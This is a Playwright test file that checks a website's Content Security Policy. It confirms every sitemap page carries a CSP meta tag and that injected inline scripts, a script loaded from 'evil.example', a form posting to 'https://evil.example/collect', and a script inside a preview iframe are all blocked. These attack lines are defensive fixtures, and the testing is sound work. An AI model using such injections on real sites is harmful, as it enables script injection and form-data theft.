import { test, expect } from '@playwright/test';

async function routes(request: import('@playwright/test').APIRequestContext) {
  const xml = await (await request.get('/sitemap-0.xml')).text();
  const paths = [...xml.matchAll(/<loc>https:\/\/intervene\.uk([^<]*)<\/loc>/g)].map((m) => m[1]);
  return [...new Set([...paths, '/method/', '/signature/', '/signature/email.html', '/readiness-snapshot/', '/legal/privacy/'])];
}

test('every page carries a meta CSP and loads without a policy violation', async ({ page, request }) => {
  const list = await routes(request);
  expect(list.length).toBeGreaterThan(20);
  for (const path of list) {
    const problems: string[] = [];
    page.removeAllListeners('console');
    page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) problems.push(m.text()); });
    await page.addInitScript(() => {
      (window as any).__violations = [];
      document.addEventListener('securitypolicyviolation', (e) => (window as any).__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
    });
    await page.goto(path, { waitUntil: 'networkidle' });
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').count();
    expect(csp, `${path} has a CSP meta`).toBe(1);
    // Email artwork uses absolute https://intervene.uk URLs, which is 'self' only in
    // production; on the local preview origin they are the one expected img-src block.
    const seen = (await page.evaluate(() => (window as any).__violations)) as string[];
    const unexpected = seen.filter((v) => !/^img-src https:\/\/intervene\.uk\/assets\//.test(v));
    expect(unexpected, path).toEqual([]);
    if (path !== '/signature/email.html') expect(seen, path).toEqual([]);
    expect(problems.filter((m) => !/image 'https:\/\/intervene\.uk\/assets\//.test(m)), path).toEqual([]);
  }
});

test('injected inline and foreign scripts are blocked', async ({ page }) => {
  await page.goto('/');
  const result = await page.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));
    const inline = document.createElement('script');
    inline.textContent = 'window.__pwned = "inline"';
    document.body.appendChild(inline);
    const foreign = document.createElement('script');
    foreign.src = 'https://evil.example/x.js';
    document.body.appendChild(foreign);
    await new Promise((r) => setTimeout(r, 300));
    return { pwned: (window as any).__pwned ?? null, seen };
  });
  expect(result.pwned).toBeNull();
  expect(result.seen.some((d) => d.startsWith('script-src'))).toBe(true);
});

test('a form cannot be pointed at a foreign origin', async ({ page }) => {
  await page.goto('/contact/');
  const blocked = await page.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));
    const form = document.createElement('form');
    form.action = 'https://evil.example/collect';
    form.method = 'POST';
    document.body.appendChild(form);
    try { form.requestSubmit(); } catch { /* navigation blocked */ }
    await new Promise((r) => setTimeout(r, 300));
    return seen;
  });
  expect(blocked).toContain('form-action');
});

test('signature previews (srcdoc iframes) inherit the policy and still render', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text()); });
  await page.goto('/signature/', { waitUntil: 'networkidle' });
  const frames = page.locator('iframe[data-signature-preview]');
  expect(await frames.count()).toBe(2);
  for (let i = 0; i < 2; i++) {
    const info = await frames.nth(i).evaluate((f: HTMLIFrameElement) => ({
      text: f.contentDocument?.body?.textContent?.trim().length ?? 0,
      height: f.getBoundingClientRect().height,
    }));
    expect(info.text).toBeGreaterThan(20);
    expect(info.height).toBeGreaterThan(40);
  }
  expect(violations).toEqual([]);
});

test('an injected script inside a signature preview frame is blocked', async ({ page }) => {
  await page.goto('/signature/', { waitUntil: 'networkidle' });
  const ran = await page.locator('iframe[data-signature-preview]').first().evaluate(async (f: HTMLIFrameElement) => {
    const doc = f.contentDocument!;
    const s = doc.createElement('script');
    s.textContent = 'parent.__framePwned = 1';
    doc.body.appendChild(s);
    await new Promise((r) => setTimeout(r, 300));
    return (window as any).__framePwned === 1;
  });
  expect(ran).toBe(false);
});
